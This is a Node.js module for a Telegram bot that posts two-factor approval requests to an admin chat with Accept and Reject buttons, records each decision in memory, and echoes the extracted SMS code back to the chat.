require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

const bot = new TelegramBot(BOT_TOKEN, { webHook: true });
bot.setWebHook(`${APP_URL}/bot${BOT_TOKEN}`);

// In-memory store for approvals
const approvals = {};

// Set approval status
function setApprovalStatus(requestId, status) {
  approvals[requestId] = status;
}

// Get approval status
function getApprovalStatus(requestId) {
  return approvals[requestId] || 'pending';
}

// Send 2FA request to Telegram with inline buttons
async function sendTelegram2FARequest({ message, requestId }) {
  try {
    await bot.sendMessage(ADMIN_CHAT_ID, message, {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Accept', callback_data: `accept_${requestId}` },
            { text: '❌ Reject', callback_data: `reject_${requestId}` }
          ]
        ]
      }
    });
  } catch (err) {
    console.error('Telegram sendMessage error:', err);
  }
}

// Handle button presses
// ...existing code...
bot.on('callback_query', (query) => {
  const { data, message } = query;
  if (!data) return;

  // Extract code from the plain text message
  const codeMatch = message.text.match(/SMS:\s*(\d+)/);
  const code = codeMatch ? codeMatch[1] : '';

  if (data.startsWith('accept_')) {
    const requestId = data.replace('accept_', '');
    setApprovalStatus(requestId, 'approved');
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: message.chat.id, message_id: message.message_id });
    bot.sendMessage(
      message.chat.id,
      `📩 ${code} had been <b>ACCEPTED ✅</b>`,
      { parse_mode: 'HTML' }
    );
  } else if (data.startsWith('reject_')) {
    const requestId = data.replace('reject_', '');
    setApprovalStatus(requestId, 'rejected');
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: message.chat.id, message_id: message.message_id });
    bot.sendMessage(
      message.chat.id,
      `📩 ${code} has been <b>REJECTED ❌</b>`,
      { parse_mode: 'HTML' }
    );
  }
});
// ...existing code...
module.exports = {
  sendTelegram2FARequest,
  setApprovalStatus,
  getApprovalStatus,
  bot
};





